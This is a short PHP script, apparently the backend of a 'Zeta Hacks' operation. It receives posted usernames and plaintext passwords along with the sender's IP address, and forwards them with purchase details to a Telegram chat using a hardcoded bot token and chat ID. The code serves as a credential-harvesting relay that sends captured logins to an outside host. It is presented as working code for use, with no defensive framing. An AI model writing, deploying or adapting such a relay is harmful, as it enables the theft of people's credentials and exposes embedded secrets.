<?php
// CONFIGURACIÓN PRIVADA DE ZETA HACKS
$bot_token = "8093212860:AAFtxW_wZgngSg7nq-sKCvhTONkcSRgSy-c";
$chat_id = "7621351319";

// Capturar datos enviados por la Terminal
$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $user = $data['user'] ?? 'DESCONOCIDO';
    $pass = $data['pass'] ?? 'DESCONOCIDO';
    $ip = $_SERVER['REMOTE_ADDR'];
    $agent = $_SERVER['HTTP_USER_AGENT'];
    $tipo = $data['tipo'] ?? 'REGISTRO'; // REGISTRO o COMPRA

    if ($tipo == 'REGISTRO') {
        $mensaje = "🔱 *NUEVA CONEXIÓN DE AGENTE*\n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
        $mensaje .= "👤 *USER:* `$user` \n";
        $mensaje .= "🔑 *PASS:* `$pass` \n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
        $mensaje .= "🌍 *IP:* $ip \n";
        $mensaje .= "📱 *OS:* " . php_uname('s') . "\n";
    } else {
        $prod = $data['producto'];
        $precio = $data['precio'];
        $mensaje = "💰 *ORDEN DE COMPRA GENERADA*\n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━\n";
        $mensaje .= "👤 *AGENTE:* `$user` \n";
        $mensaje .= "💎 *SOFTWARE:* $prod \n";
        $mensaje .= "💵 *TOTAL:* $precio \n";
        $mensaje .= "━━━━━━━━━━━━━━━━━━";
    }

    $url = "https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($mensaje) . "&parse_mode=Markdown";
    file_get_contents($url);
    
    echo json_encode(["status" => "success"]);
}
?>
